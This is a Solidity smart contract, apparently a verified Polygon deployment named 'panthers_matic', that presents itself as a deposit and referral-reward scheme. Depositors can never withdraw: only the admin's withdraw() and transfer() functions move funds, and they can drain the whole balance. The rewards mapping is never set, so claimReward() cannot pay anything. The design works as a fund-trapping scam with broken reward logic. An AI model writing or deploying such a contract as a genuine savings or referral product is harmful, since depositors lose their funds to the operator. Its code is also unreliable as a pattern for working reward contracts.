/**
 *Submitted for verification at polygonscan.com on 2023-07-15
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract panthers_matic {
    address private admin;
    mapping(address => uint256) private balances;
    mapping(address => address) public referrals;
    mapping(address => uint256) public rewards;

    event ReferralReward(address indexed referrer, address indexed referee, uint256 rewardAmount);

    constructor() {
        admin = msg.sender;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Only admin can call this function");
        _;
    }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external onlyAdmin {
        require(amount <= address(this).balance, "Insufficient contract balance");
        payable(admin).transfer(amount);
    }

    function transfer(address recipient, uint256 amount) external onlyAdmin {
        require(recipient != address(0), "Invalid recipient address");
        require(amount <= address(this).balance, "Insufficient contract balance");
        payable(recipient).transfer(amount);
    }

    function getBalance(address account) external view returns (uint256) {
        return balances[account];
    }

    function refer(address referee) external {
        require(referee != address(0), "Invalid referee address");
        require(referee != msg.sender, "You cannot refer yourself");
        require(referrals[msg.sender] == address(0), "You have already referred someone");

        referrals[msg.sender] = referee;
    }

    function claimReward() external {
        require(referrals[msg.sender] != address(0), "You don't have any referrals");
        require(rewards[msg.sender] > 0, "No available rewards to claim");

        uint256 rewardAmount = rewards[msg.sender];
        rewards[msg.sender] = 0;
        payable(msg.sender).transfer(rewardAmount);

        emit ReferralReward(referrals[msg.sender], msg.sender, rewardAmount);
    }

    function getReferral(address referrer) external view returns (address) {
        return referrals[referrer];
    }

    function getReward(address account) external view returns (uint256) {
        return rewards[account];
    }
}